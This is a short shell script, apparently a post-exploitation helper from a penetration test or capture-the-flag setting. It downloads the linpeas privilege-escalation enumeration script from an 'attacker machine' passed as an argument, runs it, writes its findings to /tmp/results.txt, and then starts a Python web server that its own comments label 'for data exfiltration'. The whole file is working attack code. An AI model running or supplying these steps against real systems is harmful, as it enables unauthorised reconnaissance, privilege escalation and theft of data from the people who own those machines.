echo "getting linpeas from attacker machine"
wget http://$1/linpeas.sh;
echo "giving linpeas execute permission"
chmod +x linpeas.sh;
echo "Running linpeas and saving results into a text file"
./linpeas.sh > /tmp/results.txt;
echo "Setting up a python server for data exfiltration"
python3 -m http.server 8888;